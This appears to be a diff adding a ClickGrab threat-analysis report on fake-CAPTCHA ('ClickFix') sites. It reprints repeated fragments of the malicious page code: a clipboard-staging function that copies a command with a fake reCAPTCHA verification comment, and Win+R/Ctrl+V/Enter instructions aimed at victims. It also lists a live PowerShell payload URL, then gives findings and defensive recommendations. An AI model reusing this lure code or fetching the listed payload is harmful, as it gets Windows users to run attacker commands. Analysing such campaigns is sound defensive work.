showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" &amp;&amp; verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {... ...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");... ...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText... ...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" &amp;&amp; verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {... ...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");... ...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText... ...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" &amp;&amp; verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {... ...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");... ...); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextA... ...ck", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "21px 0 0 12px"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" &amp;&amp; verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun + suffix + ploy + verification_id + end setClipboardCopyData(textToCopy); } function showVerifyWindow()... ...dy.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");... &lt;img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""&gt; ...="" id="spinner"&gt; &lt;/div&gt; &lt;div id="verify-window" class="verify-window"&gt; &lt;div class="verify-container"&gt; &lt;header class="verify-header"&gt; &lt;span class="verify-header-text-medium m-p block"&gt;Complete these&lt;/span&gt; &lt;span class="verify-header-text-big m-p block"&gt;Verification Steps&lt;/span&gt; &lt;span class="verify-header-text-medium m-p block"&gt;&lt;/span&gt; &lt;/header&gt; &lt;main class="verify-main"&gt; &lt;p&gt; To better prove you are not a robot, please: &lt;/p&gt; &lt;ol&gt; &lt;li&gt; Press &amp; hold the Windows Key &lt;i class="fab fa-windows"&gt;&lt;/i&gt; + &lt;b&gt;R&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; In the verification window, press &lt;b&gt;Ctrl&lt;/b&gt; + &lt;b&gt;V&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; Press &lt;b&gt;Enter&lt;/b&gt; on your keyboard to finish. &lt;/li&gt; &lt;/ol&gt; &lt;p&gt; You will observe and agree: &lt;br&gt; &lt;code&gt; â "I am not a robot - reCAPTCHA Verification Hash: &lt;span id="verification-id"&gt;1110&lt;/span&gt;" &lt;/code&gt; &lt;/p&gt; &lt;/main&gt; &lt;/div&gt; &lt;footer class="verify-container verif... &lt;div class="verify-footer-left"&gt; Perform the steps above to finish verification. &lt;/div&gt; &lt;p class="im-not-a-robot m-p line-normal"&gt;I'm not a robot&lt;/p&gt; &lt;img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""&gt; ...&lt;div class="overlay" id="overlay"&gt;&lt;/div&gt; &lt;div class="recaptcha-box"&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p&gt;Please verify that you are a human to continue.&lt;/p&gt; &lt;div class="container m-p"&gt; &lt;div id="checkbox-window" class="checkbox-window m-p block"&gt; &lt;div class="checkbox-container m-p"&gt; &lt;button type="button" id="checkbox" class="checkbox m-p line-normal"&gt;&lt;/button&gt; &lt;/div&gt; &lt;p style="margin: 0 !important;" cla... ...id="spinner"&gt; &lt;/div&gt; &lt;div id="verify-window" class="verify-window"&gt; &lt;div class="verify-container"&gt; &lt;header class="verify-header"&gt; &lt;span class="verify-header-text-medium m-p block"&gt;Complete these&lt;/span&gt; &lt;span class="verify-header-text-big m-p block"&gt;Verification Steps&lt;/span&gt; &lt;span class="verify-header-text-medium m-p block"&gt;&lt;/span&gt; &lt;/header&gt; &lt;main class="verify-main"&gt; &lt;p&gt; To better prove you are not a robot, please: &lt;/p&gt; &lt;ol&gt; &lt;li&gt; Press &amp; hold the Windows Key &lt;i class="fab fa-windows"&gt;&lt;/i&gt; + &lt;b&gt;R&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; In the verification window, press &lt;b&gt;Ctrl&lt;/b&gt; + &lt;b&gt;V&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; Press &lt;b&gt;Enter&lt;/b&gt; on your keyboard to finish. &lt;/li&gt; &lt;/ol&gt; &lt;p&gt; You will observe and agree: &lt;br&gt; &lt;code&gt; â "I am not a robot - reCAPTCHA Verification ID: &lt;span id="verification-id"&gt;146820&lt;/span&gt;" &lt;/code&gt; &lt;/p&gt; &lt;/main&gt; &lt;/div&gt; &lt;footer class="verify-container veri... &lt;div class="verify-footer-left"&gt; Perform the steps above to finish verification. &lt;/div&gt; &lt;title&gt;Verify You Are Human&lt;/title&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal"&gt;I'm not a robot&lt;/p&gt; &lt;img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""&gt; ...&lt;div class="overlay" id="overlay"&gt;&lt;/div&gt; &lt;div class="recaptcha-box"&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p&gt;Please verify that you are a human to continue.&lt;/p&gt; &lt;div class="container m-p"&gt; &lt;div id="checkbox-window" class="checkbox-window m-p block"&gt; &lt;div class="checkbox-container m-p"&gt; &lt;button type="button" id="checkbox" class="checkbox m-p line-normal"&gt;&lt;/button&gt; &lt;/div&gt; &lt;p style="margin: 0 !important;" cla... ...id="spinner"&gt; &lt;/div&gt; &lt;div id="verify-window" class="verify-window"&gt; &lt;div class="verify-container"&gt; &lt;header class="verify-header"&gt; &lt;span class="verify-header-text-medium m-p block"&gt;Complete these&lt;/span&gt; &lt;span class="verify-header-text-big m-p block"&gt;Verification Steps&lt;/span&gt; &lt;span class="verify-header-text-medium m-p block"&gt;&lt;/span&gt; &lt;/header&gt; &lt;main class="verify-main"&gt; &lt;p&gt; To better prove you are not a robot, please: &lt;/p&gt; &lt;ol&gt; &lt;li&gt; Press &amp; hold the Windows Key &lt;i class="fab fa-windows"&gt;&lt;/i&gt; + &lt;b&gt;R&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; In the verification window, press &lt;b&gt;Ctrl&lt;/b&gt; + &lt;b&gt;V&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; Press &lt;b&gt;Enter&lt;/b&gt; on your keyboard to finish. &lt;/li&gt; &lt;/ol&gt; &lt;p&gt; You will observe and agree: &lt;br&gt; &lt;code&gt; ✅ "I am not a robot - reCAPTCHA Verification ID: &lt;span id="verification-id"&gt;146820&lt;/span&gt;" &lt;/code&gt; &lt;/p&gt; &lt;/main&gt; &lt;/div&gt; &lt;footer class="verify-container veri... &lt;div class="verify-footer-left"&gt; Perform the steps above to finish verification. &lt;/div&gt; &lt;title&gt;Verify You Are Human&lt;/title&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal"&gt;I'm not a robot&lt;/p&gt; &lt;img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""&gt; ...&lt;div class="overlay" id="overlay"&gt;&lt;/div&gt; &lt;div class="recaptcha-box"&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p&gt;Please verify that you are a human to continue.&lt;/p&gt; &lt;div class="container m-p"&gt; &lt;div id="checkbox-window" class="checkbox-window m-p block"&gt; &lt;div class="checkbox-container m-p"&gt; &lt;button type="button" id="checkbox" class="checkbox m-p line-normal"&gt;&lt;/button&gt; &lt;/div&gt; &lt;p style="margin: 0 !important;" cla... ...id="spinner"&gt; &lt;/div&gt; &lt;div id="verify-window" class="verify-window"&gt; &lt;div class="verify-container"&gt; &lt;header class="verify-header"&gt; &lt;span class="verify-header-text-medium m-p block"&gt;Complete these&lt;/span&gt; &lt;span class="verify-header-text-big m-p block"&gt;Verification Steps&lt;/span&gt; &lt;span class="verify-header-text-medium m-p block"&gt;&lt;/span&gt; &lt;/header&gt; &lt;main class="verify-main"&gt; &lt;p&gt; To better prove you are not a robot, please: &lt;/p&gt; &lt;ol&gt; &lt;li&gt; Press &amp; hold the Windows Key &lt;i class="fab fa-windows"&gt;&lt;/i&gt; + &lt;b&gt;R&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; In the verification window, press &lt;b&gt;Ctrl&lt;/b&gt; + &lt;b&gt;V&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; Press &lt;b&gt;Enter&lt;/b&gt; on your keyboard to finish. &lt;/li&gt; &lt;/ol&gt; &lt;p&gt; You will observe and agree: &lt;br&gt; &lt;code&gt; ✅ "I am not a robot - reCAPTCHA Verification ID: &lt;span id="verification-id"&gt;146820&lt;/span&gt;" &lt;/code&gt; &lt;/p&gt; &lt;/main&gt; &lt;/div&gt; &lt;footer class="verify-container veri... &lt;div class="verify-footer-left"&gt; Perform the steps above to finish verification. &lt;/div&gt; &lt;title&gt;Verify You Are Human&lt;/title&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal"&gt;I'm not a robot&lt;/p&gt; &lt;img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""&gt; ...&lt;div class="overlay" id="overlay"&gt;&lt;/div&gt; &lt;div class="recaptcha-box"&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p&gt;Please verify that you are a human to continue.&lt;/p&gt; &lt;div class="container m-p"&gt; &lt;div id="checkbox-window" class="checkbox-window m-p block"&gt; &lt;div class="checkbox-container m-p"&gt; &lt;button type="button" id="checkbox" class="checkbox m-p line-normal"&gt;&lt;/button&gt; &lt;/div&gt; &lt;p style="margin: 0 !important;" cla... ...id="spinner"&gt; &lt;/div&gt; &lt;div id="verify-window" class="verify-window"&gt; &lt;div class="verify-container"&gt; &lt;header class="verify-header"&gt; &lt;span class="verify-header-text-medium m-p block"&gt;Complete these&lt;/span&gt; &lt;span class="verify-header-text-big m-p block"&gt;Verification Steps&lt;/span&gt; &lt;span class="verify-header-text-medium m-p block"&gt;&lt;/span&gt; &lt;/header&gt; &lt;main class="verify-main"&gt; &lt;p&gt; To better prove you are not a robot, please: &lt;/p&gt; &lt;ol&gt; &lt;li&gt; Press &amp; hold the Windows Key &lt;i class="fab fa-windows"&gt;&lt;/i&gt; + &lt;b&gt;R&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; In the verification window, press &lt;b&gt;Ctrl&lt;/b&gt; + &lt;b&gt;V&lt;/b&gt;. &lt;/li&gt; &lt;li&gt; Press &lt;b&gt;Enter&lt;/b&gt; on your keyboard to finish. &lt;/li&gt; &lt;/ol&gt; &lt;p&gt; You will observe and agree: &lt;br&gt; &lt;code&gt; â "I am not a robot - reCAPTCHA Verification ID: &lt;span id="verification-id"&gt;146820&lt;/span&gt;" &lt;/code&gt; &lt;/p&gt; &lt;/main&gt; &lt;/div&gt; &lt;footer class="verify-container veri... &lt;div class="verify-footer-left"&gt; Perform the steps above to finish verification. &lt;/div&gt; &lt;title&gt;Verify You Are Human&lt;/title&gt; &lt;h2&gt;Verify You Are Human&lt;/h2&gt; &lt;p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal"&gt;I'm not a robot&lt;/p&gt; &lt;img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""&gt; ...="" id="spinner"&gt; &lt;/div&gt; &lt;div id="verify-window" class="verify-window"&gt; &lt;div class="verify-container"&gt; &lt;header class="verify-header"&gt; &lt;span class="verify-header-text-medium m-p block"&gt;å®æè¿äº&lt;/span&gt; &lt;span class="verify-header-text-big m-p block"&gt;éªè¯æ­¥éª¤&lt;/span&gt; &lt;span class="verify-header-text-medium m-p block"&gt;&lt;/span&gt; &lt;/header&gt; &lt;main class="verify-main"&gt; &lt;p&gt; ä¸ºäºæ´å¥½çè¯ææ¨ä¸æ¯æºå¨äººï¼è¯·: &lt;/p&gt; &lt;ol&gt; &lt;li&gt; æä½Windowsé® &lt;i class="fab fa-windows"&gt;&lt;/i&gt; + &lt;b&gt;R&lt;/b&gt;ã &lt;/li&gt; &lt;li&gt; å¨éªè¯çªå£ä¸­ï¼æ &lt;b&gt;Ctrl&lt;/b&gt; + &lt;b&gt;V&lt;/b&gt;ã &lt;/li&gt; &lt;li&gt; æä¸é®çä¸ç &lt;b&gt;Enter&lt;/b&gt; é®å®æã &lt;/li&gt; &lt;/ol&gt; &lt;p&gt; æ¨å°éµå®å¹¶åæ: &lt;br&gt; &lt;code&gt; â "I am not a robot - reCAPTCHA Verification ID: &lt;span id="verification-id</code></p>
+<h4>Comment Injection</h4>
+<p><strong>Instances</strong>: 6
+<strong>Examples:</strong>
+- <code># " const ploy = "</code></p>
+<h2>Attack Pattern Reconstruction</h2>
+<h3>Malicious Download Sources</h3>
+<ul>
+<li><code>https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1</code></li>
+</ul>
+<h2>Key Findings</h2>
+<ol>
+<li><strong>Prevalence</strong>: 60.0% of analyzed sites contained malicious content</li>
+<li><strong>Primary Attack Vector</strong>: Fake CAPTCHA verification leading to clipboard hijacking</li>
+<li><strong>Target Platform</strong>: Windows systems via PowerShell execution</li>
+<li><strong>Social Engineering</strong>: Sophisticated UI mimicking legitimate Google reCAPTCHA</li>
+</ol>
+<h2>Recommendations</h2>
+<ol>
+<li><strong>User Education</strong>: Warn users about fake CAPTCHA verification schemes</li>
+<li><strong>Clipboard Monitoring</strong>: Implement clipboard monitoring for suspicious PowerShell commands</li>
+<li><strong>URL Filtering</strong>: Block known malicious domains identified in this analysis</li>
+<li><strong>PowerShell Execution Policy</strong>: Restrict PowerShell execution in corporate environments</li>
+</ol>
+    </div>
+</section>
+
+
+<script>
+function toggleSite(header) {
+    const card = header.closest('.site-card');
+    card.classList.toggle('expanded');
+}
+
+function showTab(button, tabId) {
+    const tabs = button.parentElement.querySelectorAll('.detail-tab');
+    tabs.forEach(tab => tab.classList.remove('active'));
+    button.classList.add('active');
+    
+    const card = button.closest('.site-details');
+    const contents = card.querySelectorAll('.tab-content');
+    contents.forEach(content => content.classList.remove('active'));
+    document.getElementById(tabId).classList.add('active');
+}
+
+function expandAll() {
+    document.querySelectorAll('.site-card').forEach(card => {
+        card.classList.add('expanded');
+    });
+}
+
+function collapseAll() {
+    document.querySelectorAll('.site-card').forEach(card => {
+        card.classList.remove('expanded');
+    });
+}
+
+function copyCode(button) {
+    const code = button.nextElementSibling.textContent;
+    navigator.clipboard.writeText(code);
+    button.textContent = '✅ Copied!';
+    setTimeout(() => button.textContent = 'Copy', 2000);
+}
+</script>
+
+        </div>
+    </main>
+
+    <footer class="site-footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <span class="text-logo">CLICKGRAB</span>
+                    <p>Analyzing ClickFix and FakeCAPTCHA URLs from URLhaus</p>
+                </div>
+                <div class="footer-links">
+                    <h3>Resources</h3>
+                    <ul>
+                        <li><a href="/ClickGrab/analysis.html">Analysis</a></li>
+                        <li><a href="/ClickGrab/reports.html">Reports</a></li>
+                        <li><a href="/ClickGrab/techniques.html">Techniques</a></li>
+                <li><a href="/ClickGrab/mitigations.html">Mitigations</a></li>
+                        <li><a href="https://urlhaus.abuse.ch/" target="_blank">URLhaus</a></li>
+                    </ul>
+                </div>
+                <div class="footer-links">
+                    <h3>Connect</h3>
+                    <ul>
+                        <li><a href="https://github.com/MHaggis/clickgrab" target="_blank">GitHub</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2025 ClickGrab Project. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="/ClickGrab/assets/js/main.js"></script>
+    
+</body>
+</html> 
